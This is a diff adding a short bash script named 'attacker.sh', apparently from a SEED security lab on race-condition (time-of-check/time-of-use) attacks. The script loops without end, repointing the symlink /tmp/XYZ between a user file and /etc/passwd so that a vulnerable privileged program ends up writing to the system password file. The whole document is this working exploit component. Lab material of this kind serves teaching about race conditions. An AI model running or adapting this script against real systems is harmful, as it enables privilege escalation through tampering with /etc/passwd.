@@ -1,0 +1,10 @@
+#!/bin/bash
+# attacker.sh
+i=0
+while [ 1 ];
+do
+	i=$(( $i + 1 ))
+	ln -sf /home/seed/beef /tmp/XYZ
+	ln -sf /etc/passwd /tmp/XYZ
+	echo "changed ln for $i times so far."
+done
